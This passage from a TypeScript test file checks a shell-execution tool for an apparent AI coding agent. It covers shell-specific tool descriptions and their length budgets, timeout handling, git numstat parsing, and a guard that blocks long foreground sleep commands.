      platform: 'linux' | 'win32',
      comSpec?: string,
      msystem?: string,
    ): ShellTool {
      vi.mocked(os.platform).mockReturnValue(platform);
      delete process.env['ComSpec'];
      delete process.env['MSYSTEM'];
      delete process.env['TERM'];
      if (comSpec) process.env['ComSpec'] = comSpec;
      if (msystem) process.env['MSYSTEM'] = msystem;
      return new ShellTool(mockConfig);
    }

    const CMD = 'C:\\WINDOWS\\System32\\cmd.exe';
    const WIN_PS =
      'C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe';
    const PWSH = 'C:\\Program Files\\PowerShell\\7\\pwsh.exe';

    it('should return the windows description when on windows', async () => {
      const shellTool = buildForShape('win32');
      expect(shellTool.description).toMatchSnapshot();
      expectText(shellTool.description, [
        "Use '&' only when you need to run commands sequentially",
        "DO NOT use ';' or newlines to separate commands in cmd.exe.",
      ]);
      expect(getCommandParameterDescription(shellTool)).toBe(
        'Exact cmd.exe command to execute as `cmd.exe /d /s /c <command>`',
      );
    });

    it.each(['cmd.exe', 'powershell.exe'])(
      'advertises Bash for SSH when the local shell is %s',
      async (localShell) => {
        const local = buildForShape('win32', localShell);
        expect(getCommandParameterDescription(local)).not.toContain('bash -c');
        const remote = new SshExecutionEnvironment(
          { host: 'test-host', directory: '/remote' },
          'C:\\ssh-anchor',
        );
        onTestFinished(() => remote.dispose());
        mockConfig.getExecutionEnvironment = vi.fn().mockReturnValue(remote);
        const tool = new ShellTool(mockConfig);
        expectText(
          tool.description,
          ['The active shell is Bash.'],
          ['The active shell is PowerShell.', 'cmd.exe'],
        );
        expect(tool.schema.description).toContain('`bash -c <command>`');
        expect(getCommandParameterDescription(tool)).toBe(
          'Exact bash command to execute as `bash -c <command>`',
        );
      },
    );

    it('should return the non-windows description when not on windows', async () => {
      vi.mocked(os.platform).mockReturnValue('linux');
      const shellTool = new ShellTool(mockConfig);
      expect(shellTool.description).toMatchSnapshot();
      expect(getCommandParameterDescription(shellTool)).toBe(
        'Exact bash command to execute as `bash -c <command>`',
      );
    });

    it('should describe PowerShell when ComSpec points to powershell.exe', async () => {
      const shellTool = buildForShape('win32', WIN_PS);

      expectText(
        shellTool.description,
        [
          '`powershell.exe -NoProfile -Command <command>`',
          'The active shell is PowerShell.',
          'Do NOT use Bash-only forms such as ANSI-C quoting',
          "Windows PowerShell does not support '&&'.",
        ],
        ["use a single run_shell_command call with '&&'"],
      );
      expect(getCommandParameterDescription(shellTool)).toBe(
        'Exact PowerShell command to execute as `powershell.exe -NoProfile -Command <command>`',
      );
    });

    it('should describe pwsh when ComSpec points to pwsh.exe', async () => {
      const shellTool = buildForShape('win32', PWSH);

      expectText(shellTool.description, [
        '`pwsh.exe -NoProfile -Command <command>`',
        "use a single run_shell_command call with '&&'",
      ]);
      expect(getCommandParameterDescription(shellTool)).toBe(
        'Exact PowerShell command to execute as `pwsh.exe -NoProfile -Command <command>`',
      );
    });

    it('should describe bash when Windows is running in Git Bash', async () => {
      const shellTool = buildForShape('win32', CMD, 'MINGW64');

      expectText(
        shellTool.description,
        ['`bash -c <command>`', 'The active shell is Bash.', 'ANSI-C quoting'],
        ['Command process group can be terminated'],
      );
      expect(getCommandParameterDescription(shellTool)).toBe(
        'Exact bash command to execute as `bash -c <command>`',
      );
    });

    /**
     * Per-turn size budgets, as for Workflow and Agent (`workflow.test.ts`,
     * `agent-description-budget.test.ts`, #12054); this is the second-largest
     * resident description. Snapshots pin what it says, not how much
     * (`vitest -u` accepts any growth), and every character goes out on every
     * request. Budgets also keep shells comparable: cmd and PowerShell are
     * cheaper than bash, and levelling them up should be deliberate.
     * Measured: bash/linux 4,946 · Git Bash 4,771 · powershell.exe 4,456 ·
     * pwsh.exe 4,350 · cmd.exe 4,207; each budget adds ~350 (a sentence), so
     * a paragraph added to the shared prompt reddens all five rows.
     */
    const SHAPES: Array<
      [
        string,
        'linux' | 'win32',
        string | undefined,
        string | undefined,
        number,
      ]
    > = [
      ['bash on linux', 'linux', undefined, undefined, 4_670],
      ['Git Bash on win32', 'win32', CMD, 'MINGW64', 4_490],
      ['powershell.exe', 'win32', WIN_PS, undefined, 4_390],
      ['pwsh.exe', 'win32', PWSH, undefined, 4_290],
      ['cmd.exe', 'win32', CMD, undefined, 4_150],
    ];

    it.each(SHAPES)(
      'keeps the %s description within its per-turn budget',
      (_name, platform, comSpec, msystem, budget) => {
        expect(
          buildForShape(platform, comSpec, msystem).description.length,
        ).toBeLessThanOrEqual(budget);
      },
    );

    // The other half of a budget: what may not be traded to meet one. #12054
    // lists these quoting, dedicated-tool and execution-boundary rules as
    // verbose-reading but load-bearing.
    it.each(SHAPES)(
      'keeps the call-boundary rules in the %s description',
      (_name, platform, comSpec, msystem) => {
        const { description } = buildForShape(platform, comSpec, msystem);
        for (const clause of [
          'DO NOT use it for file operations',
          'Content search: Use grep_search',
          'Read files: Use read_file',
          'up to 600000ms',
          'Shell argument quoting and special characters',
          'When issuing multiple commands',
          'use `task_stop` when a task id is available',
          'pkill node',
          'avoiding usage of `cd`',
        ]) {
          expect(description).toContain(clause);
        }
      },
    );

    // Other parameter descriptions don't vary by shell, so one shape suffices;
    // `command` does vary and is pinned exactly per shape above.
    it.each<[string, number]>([
      ['is_background', 350],
      ['directory', 250],
      ['description', 220],
      ['timeout', 100],
    ])(
      'keeps the %s parameter description within its budget',
      (name, budget) => {
        const schema = buildForShape('linux').schema.parametersJsonSchema as {
          properties: Record<string, { description?: string }>;
        };
        // No `?? 0` fallback: renaming one of these parameters must fail the
        // row rather than pass it on a length of zero.
        const description = schema.properties[name]?.description;
        if (description === undefined) {
          throw new Error(`shell schema has no budgeted parameter "${name}"`);
        }
        expect(description.length).toBeLessThanOrEqual(budget);
      },
    );
  });

  describe('timeout parameter', () => {
    const TIMED_OUT =
      'Command timed out after 5000ms before it could complete.';

    /** Runs a 5s-timeout foreground command under `signal`, then settles it with `result`. */
    const runTimed = (
      result: Partial<ShellExecutionResult>,
      { signal = new AbortController().signal, beforeSettle = () => {} } = {},
    ) => {
      const promise = build('long-running-command', { timeout: 5000 }).execute(
        signal,
      );
      beforeSettle();
      resolveExecutionPromise(
        shellResult({ exitCode: null, aborted: true, ...result }),
      );
      return promise;
    };

    it('should validate timeout parameter correctly', async () => {
      for (const [timeout, error] of [
        [5000, null], // Valid timeout
        [500, null], // Valid small timeout
        [0, 'params/timeout must be >= 1'], // Zero timeout
        [-1000, 'params/timeout must be >= 1'], // Negative timeout
        [700000, 'params/timeout must be <= 600000'], // Timeout too large
        [5000.5, 'params/timeout must be integer'], // Non-integer timeout
        // Non-number timeout (schema validation catches this first)
        ['invalid' as unknown as number, 'params/timeout must be integer'],
      ] as Array<[number, string | null]>) {
        const act = () => build('echo test', { timeout });
        if (error === null) expect(act).not.toThrow();
        else expect(act).toThrow(error);
      }
    });

    it('should include timeout in description for foreground commands', async () => {
      const invocation = build('npm test', { timeout: 30000 });

      expect(invocation.getDescription()).toBe('npm test [timeout: 30000ms]');
    });

    it('should not include timeout in description for background commands', async () => {
      const invocation = build('npm start', {
        is_background: true,
        timeout: 30000,
      });

      expect(invocation.getDescription()).toBe('npm start [background]');
    });

    it('should create combined signal with timeout for foreground execution', async () => {
      const mockAbortSignal = new AbortController().signal;
      const promise = build('sleep 1', { timeout: 5000 }).execute(
        mockAbortSignal,
      );
      resolveExecutionPromise(shellResult());
      await promise;

      // Verify that ShellExecutionService was called with a combined signal
      expectSpawned(expect.any(String));

      // The signal passed should be different from the original signal
      const calledSignal = mockShellExecutionService.mock.calls[0][3];
      expect(calledSignal).not.toBe(mockAbortSignal);
    });

    it('keeps the first timeout after a later user cancellation', async () => {
      const userAbortController = new AbortController();
      stubAbortSignal(fakeSignal(false), timedOutSignal());

      const result = await runTimed(
        { output: 'partial output' },
        {
          signal: userAbortController.signal,
          beforeSettle: () => userAbortController.abort(),
        },
      );

      expectText(result.llmContent, [
        'Command timed out after 5000ms',
        'Below is the output before it timed out',
      ]);
      expect(shellResultText(result.returnDisplay)).toContain(TIMED_OUT);
      expect(result.returnDisplay).toMatchObject({
        type: 'shell_result',
        output: 'partial output',
        outcome: 'timed_out',
        error: expect.stringContaining('timed out'),
      });
      expect(shellResultText(result.returnDisplay)).toContain('partial output');
      expect(result.error).toEqual({
        message: TIMED_OUT,
        type: ToolErrorType.EXECUTION_TIMEOUT,
      });
    });

    it('returns a structured timeout when the command produced no output', async () => {
      stubAbortSignal(timedOutSignal());

      const result = await runTimed({});

      expect(result.llmContent).toContain(
        'There was no output before it timed out.',
      );
      expect(shellResultText(result.returnDisplay)).toContain(
        'There was no output before it timed out.',
      );
      expect(result.error?.type).toBe(ToolErrorType.EXECUTION_TIMEOUT);
    });

    it('keeps truncated timeout detail out of the operational error summary', async () => {
      await spyTruncation({
        content:
          'Tool output was too large and has been truncated.\n' +
          'Full output saved to: /tmp/tool-output.txt',
        outputFile: '/tmp/tool-output.txt',
      });
      stubAbortSignal(timedOutSignal());

      const result = await runTimed({ output: 'x'.repeat(40_000) });

      expect(result.llmContent).toContain('/tmp/tool-output.txt');
      expect(shellResultText(result.returnDisplay)).toContain(
        '/tmp/tool-output.txt',
      );
      expect(result.error).toEqual({
        message: TIMED_OUT,
        type: ToolErrorType.EXECUTION_TIMEOUT,
      });
    });

    it('keeps the first user cancellation after a later timeout', async () => {
      const userAbortController = new AbortController();
      stubAbortSignal(
        { aborted: true },
        fakeSignal(true, new DOMException('cancelled', 'AbortError')),
      );

      const result = await runTimed(
        {},
        {
          signal: userAbortController.signal,
          beforeSettle: () => userAbortController.abort(),
        },
      );
      expect(result.llmContent).toContain('cancelled by user');
      expect(result.error).toBeUndefined();
    });

    it('should use default timeout behavior when timeout is not specified', async () => {
      const promise = build('echo test').execute(new AbortController().signal);
      resolveExecutionPromise(shellResult({ output: 'test' }));
      await promise;

      // Should create a combined signal with the default timeout when no timeout is specified
      expectSpawned(expect.any(String));
    });
  });
});

describe('parseNumstat', () => {
  it('parses text-diff entries as (additions + deletions) * 40', () => {
    // Format: "<adds>\t<dels>\t<path>"
    const out = '2\t3\tsrc/main.ts';
    expect(parseNumstat(out).get('src/main.ts')).toBe(200);
  });

  it('uses a fixed fallback for binary entries (- - path)', () => {
    const out = ['-\t-\tassets/logo.png', '5\t0\tsrc/main.ts'].join('\n');
    const sizes = parseNumstat(out);
    // Binary file still lands in the map so attribution doesn't drop
    // it via diffSize=0; exact size doesn't matter, the constant just
    // needs to be > 0.
    expect(sizes.get('assets/logo.png')).toBeGreaterThan(0);
    expect(sizes.get('src/main.ts')).toBe(200);
  });

  it('normalizes brace rename notation to the new path', () => {
    const out = '3\t1\tsrc/{old => new}/file.ts';
    expect([...parseNumstat(out).keys()]).toEqual(['src/new/file.ts']);
  });

  it('normalizes bare cross-directory rename to the new path', () => {
    const out = '1\t1\told/dir/file.ts => new/dir/file.ts';
    expect([...parseNumstat(out).keys()]).toEqual(['new/dir/file.ts']);
  });

  it('ignores malformed lines instead of crashing', () => {
    const out = [
      '',
      'garbage line',
      '5\t2\tsrc/ok.ts',
      'a\tb\tsrc/bad.ts',
    ].join('\n');
    const sizes = parseNumstat(out);
    expect([...sizes.keys()]).toEqual(['src/ok.ts']);
  });
});

describe('detectBlockedSleepPattern', () => {
  const STANDALONE_5 = 'standalone sleep 5';
  const THEN_ECHO_OK = 'sleep 5 followed by: echo ok';
  it.each<[string, Array<[command: string, expected: string | null]>]>([
    [
      'blocks standalone sleep >= 2s',
      [
        ['sleep 5', STANDALONE_5],
        ['sleep 10', 'standalone sleep 10'],
        ['sleep 2.5', 'standalone sleep 2.5'],
        ['sleep 2s', 'standalone sleep 2s'],
        ['sleep 2000ms', 'standalone sleep 2000ms'],
        ['sleep 3m', 'standalone sleep 3m'],
      ],
    ],
    [
      'blocks sleep followed by another command',
      [
        [
          'sleep 5 && curl http://localhost',
          'sleep 5 followed by: curl http://localhost',
        ],
        ['sleep 3; echo done', 'sleep 3 followed by: echo done'],
        ['sleep 2.5 || echo done', 'sleep 2.5 followed by: echo done'],
        ['sleep 2s\necho done', 'sleep 2s followed by: echo done'],
      ],
    ],
    [
      'allows sleep < 2s',
      [
        ['sleep 1', null],
        ['sleep 0', null],
      ],
    ],
    [
      'allows sleep durations below 2 seconds',
      [
        ['sleep 0.5', null],
        ['sleep 1.5', null],
        ['sleep 1500ms', null],
      ],
    ],
    ['allows sleep not as first subcommand', [['echo hello && sleep 5', null]]],
    [
      'allows non-sleep commands',
      [
        ['cat file.txt', null],
        ['npm run dev', null],
      ],
    ],
    [
      'allows sleep in pipelines',
      [
        ['sleep 5 | cat', null],
        ['sleep 10 | while read line; do echo $line; done', null],
      ],
    ],
    [
      'allows backgrounded sleep (bare &)',
      [
        ['sleep 5 & echo done', null],
        ['sleep 10 & wait', null],
      ],
    ],
    ['returns null for empty command', [['', null]]],
    // Shell ignores trailing comments, so these are equivalent to
    // standalone foreground sleeps unless they use the explicit
    // intentional-sleep escape hatch.
    [
      'blocks sleep followed by a top-level shell comment',
      [
        ['sleep 5 # wait', STANDALONE_5],
        ['sleep 5  #wait', STANDALONE_5],
        ['sleep 2s   # comment', 'standalone sleep 2s'],
        ['sleep 5 && echo ok # trailing', THEN_ECHO_OK],
      ],
    ],
    [
      'allows standalone sleep with an intentional sleep comment',
      [
        ['sleep 5 # intentional-sleep: wait for MCP rate limit reset', null],
        ['sleep 2s # intentional-sleep: deliberate rate limit backoff', null],
        ['sleep 10m # intentional-sleep: wait for MCP rate limit reset', null],
      ],
    ],
    [
      'requires a meaningful intentional sleep reason',
      [
        ['sleep 5 # intentional-sleep:', STANDALONE_5],
        ['sleep 5 # intentional-sleep: wait', STANDALONE_5],
        ['sleep 5 # intentional-sleep: 1234567', STANDALONE_5],
        ['sleep 5 # intentional-sleep: 12345678', null],
      ],
    ],
    [
      'blocks intentional sleep comments above the duration cap',
      [
        [
          'sleep 601s # intentional-sleep: wait for MCP rate limit reset',
          'standalone sleep 601s',
        ],
      ],
    ],
    [
      'does not allow intentional sleep comments on leading sleep chains',
      [
        [
          'sleep 5 && echo ok # intentional-sleep: wait for rate limit reset',
          THEN_ECHO_OK,
        ],
      ],
    ],
    [
      'does not allow intentional sleep comments to hide newline commands',
      [
        [
          'sleep 5 # intentional-sleep: wait for rate limit reset\necho ok',
          THEN_ECHO_OK,
        ],
      ],
    ],
    [
      'preserves commands after a shell comment newline',
      [['sleep 5 # wait\necho ok', THEN_ECHO_OK]],
    ],
    // `#` inside single quotes is literal, so the suffix is not a comment
    // and the existing separator logic still rejects it.
    [
      'does not treat in-quoted `#` as a comment',
      [["sleep 5 'arg # not a comment'", null]],
    ],
    // This mirrors the shell validator call site: the foreground sleep
    // guard runs on `stripShellWrapper(params.command)`, so `bash -c` and
    // sibling wrappers cannot route around the block by hiding the sleep
    // inside a `-c` script. A wrapped sleep < 2s is still allowed.
    [
      'blocks wrapped foreground sleep when paired with stripShellWrapper',
      [
        [stripShellWrapper("bash -c 'sleep 5'"), STANDALONE_5],
        [stripShellWrapper("sh -c 'sleep 10'"), 'standalone sleep 10'],
        [stripShellWrapper("zsh -c 'sleep 2s'"), 'standalone sleep 2s'],
        [
          stripShellWrapper("bash -c 'sleep 5 && curl http://localhost'"),
          'sleep 5 followed by: curl http://localhost',
        ],
        [stripShellWrapper("bash -c 'sleep 1'"), null],
      ],
    ],
  ])('%s', (_title, cases) => {
    for (const [command, expected] of cases) {
      expect(detectBlockedSleepPattern(command)).toBe(expected);
    }
  });
});
